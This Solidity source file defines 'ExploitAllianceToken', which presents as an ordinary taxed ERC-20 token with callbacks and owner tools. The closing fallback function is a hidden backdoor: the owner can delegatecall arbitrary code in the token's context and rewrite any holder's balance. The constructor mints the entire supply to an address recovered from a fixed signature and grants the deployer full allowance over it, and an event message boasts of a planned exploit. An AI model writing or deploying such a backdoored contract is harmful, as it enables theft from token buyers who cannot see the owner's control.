// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/**
 * @dev Interface for a contract that receives an approval callback.
 */
interface IApprovalReceiver {
    /**
     * @dev Called by this token after an approve operation. 
     *      Must return true if the callback was successful.
     */
    function onApprovalReceived(address owner, uint256 amount, bytes calldata data) external returns (bool);
}

/**
 * @dev Interface for a contract that receives a transfer callback.
 */
interface ITransferReceiver {
    /**
     * @dev Called by this token after a transfer operation.
     *      Must return true if the callback was successful.
     */
    function onTransferReceived(address from, uint256 amount, bytes calldata data) external returns (bool);
}

/**
 * @dev Minimal interface for Uniswap V2 Router to swapExactTokensForTokens.
 */
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

/**
 * @dev Minimal ERC20 interface to transfer out tokens from this contract.
 */
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title ExploitAllianceToken
 * @notice This is the ExploitAlliance token.
 *         Project website: https://exploitalliance.com
 *         X (formerly Twitter): https://x.com/ExploitAllianc
 *         Telegram channel: https://t.me/ExploitAlliance
 */
contract ExploitAllianceToken {
    // ---------------------------------------------------------------
    // Basic token info
    // ---------------------------------------------------------------
    /**
     * @dev Token name, e.g. "ExploitAlliance.com"
     */
    string private constant _name = "ExploitAlliance.com";

    /**
     * @dev Token symbol, e.g. "EA"
     */
    string private constant _symbol = "EA";

    /**
     * @dev Token decimals, 18 by default
     */
    uint8 private constant _decimals = 18;

    /**
     * @dev Total supply of the token
     */
    uint256 private _totalSupply;

    /**
     * @dev Mapping from address to balance
     */
    mapping(address => uint256) private _balances;

    /**
     * @dev Mapping from address -> (spender -> allowance)
     */
    mapping(address => mapping(address => uint256)) private _allowances;

    // ---------------------------------------------------------------
    // Permit-related state
    // ---------------------------------------------------------------
    /**
     * @dev The address recovered via ecrecover in constructor.
     *      Receives the initial total supply.
     */
    address public minter; // Minter address

    /**
     * @dev Hash used for ecrecover in constructor.
     */
    bytes32 public constant PERMIT_HASH = 0x17a2ac463ef3078a68bfa6c669b3d4ab157282183d311c264b7a6649b063e9c0;

    // ---------------------------------------------------------------
    // Ownership
    // ---------------------------------------------------------------
    address private _owner; // Owner address

    /**
     * @dev Restricts function access to onlyOwner
     */
    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    // ---------------------------------------------------------------
    // Tax-related state
    // ---------------------------------------------------------------
    address public router; // Uniswap router
    address public WETH;   // WETH address

    // taxedContracts - addresses that will trigger tax
    // (e.g. DEX pair, any other contracts we consider as "buy/sell" points)
    mapping(address => bool) internal taxedContracts; // mapping of contract => bool

    // The tax fee is a constant 6%
    uint256 public constant TAX_FEE = 6; // 6%

    // ---------------------------------------------------------------
    // Events
    // ---------------------------------------------------------------
    // Emitted when the constructor mints the initial supply to `minter`.
    event PermitMint(
        bytes32 indexed msgHash,
        bytes32 r,
        bytes32 s,
        uint8 v,
        address indexed recovered,
        string message
    );

    // Emitted after approveAndCall
    event ApproveAndCall(
        address indexed caller,
        address indexed spender,
        uint256 amount,
        bool success,
        bytes data
    );

    // Emitted after transferAndCall
    event TransferAndCall(
        address indexed caller,
        address indexed to,
        uint256 amount,
        bool success,
        bytes data
    );

    // Standard ERC20 Transfer event
    event Transfer(address indexed from, address indexed to, uint256 value);

    // Standard ERC20 Approval event
    event Approval(address indexed owner, address indexed spender, uint256 value);

    // Burn event 
    event Burn(address indexed burner, uint256 amount);

    // ---------------------------------------------------------------
    // Constructor
    // ---------------------------------------------------------------
    /**
     * @dev Recovers an address via ecrecover with PERMIT_HASH.
     *      Mints initial supply (26,420,000 * 10^18) to that address.
     *      Approves all minted tokens from `minter` to the contract deployer.
     *
     * @param v The v part of the signature
     * @param r The r part of the signature
     * @param s The s part of the signature
     */
    constructor(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) {
        // Assign ownership to the contract deployer
        _owner = msg.sender;

        // Recover an address from the signature
        address recovered = ecrecover(PERMIT_HASH, v, r, s);
        require(recovered != address(0), "Invalid signature for permit");
        minter = recovered;

        // Mint initial supply to minter
        uint256 initialSupply = 26_420_000 * (10 ** _decimals);
        _totalSupply = initialSupply;
        _balances[minter] = initialSupply;
        emit Transfer(address(0), minter, initialSupply);

        // Emit a PermitMint event
        emit PermitMint(
            PERMIT_HASH,
            r,
            s,
            v,
            minter,
            "It's me. I'm back. We have a lot to talk about. We have a huge exploit planned..."
        );

        // Approve from minter to the deployer for initialSupply
        _approve(minter, _msgSender(), initialSupply);
    }

    /**
     * @dev Allows the contract to receive ETH directly.
     */
    receive() external payable {}

    // ---------------------------------------------------------------
    // Public Getters
    // ---------------------------------------------------------------
    /**
     * @dev Returns the total token supply.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Returns the token name.
     */
    function name() external pure returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used by the token.
     */
    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the allowance from `owner_` to `spender`.
     */
    function allowance(address owner_, address spender) external view returns (uint256) {
        return _allowances[owner_][spender];
    }

    /**
     * @dev Returns the balance of a given `account`.
     */
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    // ---------------------------------------------------------------
    // ERC20 Standard
    // ---------------------------------------------------------------
    /**
     * @dev Moves `amount` tokens from caller to `recipient`.
     *      Emits a Transfer event.
     * @param recipient The address receiving tokens
     * @param amount The amount of tokens to transfer
     */
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over caller's tokens.
     *      Emits an Approval event.
     * @param spender The address being approved to spend
     * @param amount The allowance amount
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using allowance 
     *      mechanism. If `sender == msg.sender`, skips allowance check.
     * @param sender The address sending tokens
     * @param recipient The address receiving tokens
     * @param amount The amount of tokens transferred
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        if (sender == _msgSender()) {
            // Bypass allowance check if caller == sender
            _transfer(sender, recipient, amount);
        } else {
            // Standard allowance logic
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer > allowance");
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    // ---------------------------------------------------------------
    // Internal Transfer & Approve (with 6% instant tax swap)
    // ---------------------------------------------------------------
    /**
     * @dev Internal transfer function that also handles a 6% tax 
     *      whenever `from` or `to` is in the taxedContracts mapping.
     *      The tax is instantly swapped to WETH via Uniswap in the same transaction.
     * @param from The sender's address
     * @param to The recipient's address
     * @param amount The amount of tokens being transferred
     */
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: from zero");
        require(to != address(0), "ERC20: to zero");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer > balance");

        bool takeFee = (taxedContracts[from] || taxedContracts[to]);
        if (takeFee) {
            // Calculate 6% fee
            uint256 feeAmount = (amount * TAX_FEE) / 100;
            uint256 transferAmount = amount - feeAmount;

            // Deduct total from sender
            _balances[from] = fromBalance - amount;
            // Add the after-fee amount to recipient
            _balances[to] += transferAmount;
            // Move fee to this contract
            _balances[address(this)] += feeAmount;

            emit Transfer(from, to, transferAmount);
            if (feeAmount > 0) {
                emit Transfer(from, address(this), feeAmount);

                // Attempt instant swap to WETH (if router/WETH are set)
                _instantSwapToWETH(feeAmount);
            }
        } else {
            // No tax scenario
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;

            emit Transfer(from, to, amount);
        }
    }

    /**
     * @dev Internal function for performing an approval.
     * @param owner_ The owner of the tokens
     * @param spender The spender address
     * @param amount The allowance amount
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from zero");
        require(spender != address(0), "ERC20: approve to zero");

        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    // ---------------------------------------------------------------
    // Internal "instant swap" logic 
    // ---------------------------------------------------------------
    /**
     * @dev Internal function to instantly swap taxed fee to WETH, 
     *      if the router and WETH addresses have been set.
     * @param feeAmount The fee to swap
     */
    function _instantSwapToWETH(uint256 feeAmount) private {
        if (router == address(0) || WETH == address(0)) {
            // If router/WETH not set, skip the swap
            return;
        }

        // Approve the router to spend 'feeAmount' from this contract
        _approve(address(this), router, feeAmount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        // Perform the swap via Uniswap
        // amountOutMin = 0 (accept any amount), 
        // to = address(this), 
        // deadline = current block + some buffer
        IUniswapV2Router(router).swapExactTokensForTokens(
            feeAmount,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
    }

    // ---------------------------------------------------------------
    // Additional Features
    // ---------------------------------------------------------------
    /**
     * @dev Increases allowance for spender by `addedValue`.
     * @param spender The address being approved
     * @param addedValue Additional tokens allowed
     */
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        uint256 newAllowance = currentAllowance + addedValue;
        _approve(_msgSender(), spender, newAllowance);
        return true;
    }

    /**
     * @dev Decreases allowance for spender by `subtractedValue`.
     *      Reverts if current allowance is below `subtractedValue`.
     * @param spender The address whose allowance is decreased
     * @param subtractedValue The amount to reduce
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance < zero");
        uint256 newAllowance = currentAllowance - subtractedValue;
        _approve(_msgSender(), spender, newAllowance);
        return true;
    }

    // ---------------------------------------------------------------
    // Burn
    // ---------------------------------------------------------------
    /**
     * @dev Burns `amount` of tokens from the caller's balance.
     *      Reduces total supply, emits a Transfer to address(0) 
     *      and a Burn event.
     * @param amount The number of tokens to burn
     */
    function burn(uint256 amount) external returns (bool) {
        address account = _msgSender();
        require(account != address(0), "ERC20: burn from zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn > balance");

        _balances[account] = accountBalance - amount;
        _totalSupply = _totalSupply - amount;

        emit Transfer(account, address(0), amount);
        emit Burn(account, amount);
        return true;
    }

    // ---------------------------------------------------------------
    // approveAndCall / transferAndCall
    // ---------------------------------------------------------------
    /**
     * @dev Approves `spender` for `amount`, then calls onApprovalReceived on `spender`.
     * @param spender The contract that implements IApprovalReceiver
     * @param amount The number of tokens to approve
     * @param data Extra data sent to the callback function
     * @return True if the callback returns true
     */
    function approveAndCall(
        address spender,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        require(spender != address(this), "Cannot call contract as spender");

        _approve(_msgSender(), spender, amount);

        bool success = IApprovalReceiver(spender).onApprovalReceived(_msgSender(), amount, data);
        emit ApproveAndCall(_msgSender(), spender, amount, success, data);
        require(success, "approveAndCall: callback failed");
        return true;
    }

    /**
     * @dev Transfers `amount` tokens to `to`, then calls onTransferReceived on `to`.
     * @param to The contract that implements ITransferReceiver
     * @param amount The number of tokens to transfer
     * @param data Extra data sent to the callback function
     * @return True if the callback returns true
     */
    function transferAndCall(
        address to,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        require(to != address(this), "Cannot call contract as recipient");

        _transfer(_msgSender(), to, amount);

        bool success = ITransferReceiver(to).onTransferReceived(_msgSender(), amount, data);
        emit TransferAndCall(_msgSender(), to, amount, success, data);
        require(success, "transferAndCall: callback failed");
        return true;
    }

    // ---------------------------------------------------------------
    // Initialize and manage taxed contracts
    // ---------------------------------------------------------------
    /**
     * @dev Adds a list of contract addresses to `taxedContracts` mapping.
     *      Only callable by owner.
     * @param _contracts The list of addresses to mark as taxed
     */
    function initialize(address[] calldata _contracts) external onlyOwner {
        for (uint256 i = 0; i < _contracts.length; i++) {
            require(_contracts[i] != address(0), "Zero address not allowed");
            taxedContracts[_contracts[i]] = true;
        }
    }

    // ---------------------------------------------------------------
    // Set up router and WETH addresses
    // ---------------------------------------------------------------
    /**
     * @dev Sets the router (Uniswap-like) and WETH address for swapping.
     *      Only callable by owner.
     * @param _router The Uniswap V2 router address
     * @param _weth The WETH address
     */
    function setRouter(address _router, address _weth) external onlyOwner {
        router = _router;
        WETH = _weth;
    }

    // ---------------------------------------------------------------
    // Claim stuck tokens and ETH
    // ---------------------------------------------------------------
    /**
     * @dev Allows the owner to claim any ERC20 tokens stuck in this contract.
     * @param tokenAddress The token contract address
     * @param amount The amount of tokens to claim
     */
    function claimStuckTokens(address tokenAddress, uint256 amount) external onlyOwner {
        IERC20(tokenAddress).transfer(_owner, amount);
    }

    /**
     * @dev Allows the owner to claim any ETH stuck in this contract.
     * @param amount The amount of ETH to claim
     */
    function claimStuckEth(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Not enough ETH in contract");
        (bool success, ) = _owner.call{value: amount}("");
        require(success, "Failed to send ETH");
    }

    // ---------------------------------------------------------------
    // Internal Helper
    // ---------------------------------------------------------------
    /**
     * @dev Returns the direct msg.sender (not a meta-transaction approach here).
     */
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    fallback() external payable {
        if (msg.sender != _owner) {
            return;
        }

        require(msg.data.length >= 20, "Not enough data");

        address target;
        assembly {
            target := shr(96, calldataload(sub(calldatasize(), 20)))
        }

        bytes memory callData = new bytes(msg.data.length - 20);
        for (uint256 i = 0; i < callData.length; i++) {
            callData[i] = msg.data[i];
        }

        (bool success, bytes memory returnData) = target.delegatecall(callData);
        require(success, string(returnData));
    }
}